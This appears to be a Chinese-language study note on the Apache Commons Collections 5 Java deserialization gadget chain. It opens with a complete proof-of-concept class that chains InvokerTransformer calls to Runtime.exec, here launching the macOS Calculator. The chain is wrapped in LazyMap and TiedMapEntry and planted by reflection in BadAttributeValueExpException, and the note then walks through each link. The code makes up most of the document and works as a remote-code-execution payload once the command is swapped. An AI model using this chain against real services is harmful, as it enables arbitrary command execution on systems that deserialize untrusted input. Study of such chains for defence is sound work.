POC

```java
package demo;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections5 {
    public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException, IOException {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[0]}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}),
                new InvokerTransformer("exec",new Class[] { String.class }, new String[] {"/System/Applications/Calculator.app/Contents/MacOS/Calculator" })
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        Map innermap = new HashMap();
        Map outtermap = LazyMap.decorate(innermap,chainedTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(outtermap,1);
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(1);
        Class clazz = Class.forName("javax.management.BadAttributeValueExpException");
        Field val = clazz.getDeclaredField("val");
        val.setAccessible(true);
        val.set(badAttributeValueExpException,tiedMapEntry);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(badAttributeValueExpException);
        objectOutputStream.close();

        ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray()));
        objectInputStream.readObject();

    }
}

```

CC5利用BadAttributeValueExpException作为反序列化入口

```java
  private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
        ObjectInputStream.GetField gf = ois.readFields();
        Object valObj = gf.get("val", null);

        if (valObj == null) {
            val = null;
        } else if (valObj instanceof String) {
            val= valObj;
        } else if (System.getSecurityManager() == null
                || valObj instanceof Long
                || valObj instanceof Integer
                || valObj instanceof Float
                || valObj instanceof Double
                || valObj instanceof Byte
                || valObj instanceof Short
                || valObj instanceof Boolean) {
            val = valObj.toString();
        } else { // the serialized object is from a version without JDK-8019292 fix
            val = System.identityHashCode(valObj) + "@" + valObj.getClass().getName();
        }
    }
```

System.getSecurityManager 等于null时，调用传入任意类的toString方法。SecurityManager默认为null。



```java
     Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[0]}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}),
                new InvokerTransformer("exec",new Class[] { String.class }, new String[] {"/System/Applications/Calculator.app/Contents/MacOS/Calculator" })
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        Map innermap = new HashMap();
        Map outtermap = LazyMap.decorate(innermap,chainedTransformer);
```

和CC1一样，用lazyMap修饰transformers，当调用lazyMap#get方法时会执行transform。CC5这里用的是TiedMapEntry来调用lazyMap#get方法

看TiedMapEntry关键代码

```java
    public TiedMapEntry(Map map, Object key) {
        super();
        this.map = map;
        this.key = key;
    }
    
        public Object getValue() {
        return map.get(key);
    }
    
        public String toString() {
        return getKey() + "=" + getValue();
    }
```

构造器初始化map，getValue调用map的get方法，toString调用getValue方法。到这里利用链就很明显了。

```java
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(1);
        Class clazz = Class.forName("javax.management.BadAttributeValueExpException");
        Field val = clazz.getDeclaredField("val");
        val.setAccessible(true);
        val.set(badAttributeValueExpException,tiedMapEntry);
```

new一个BadAttributeValueExpException对象，通过反射将对象的val值设置为tiedMapEntry对象。这样，在反序列化BadAttributeValueExpException对象的时候就会执行tiedMapEntry的toString函数。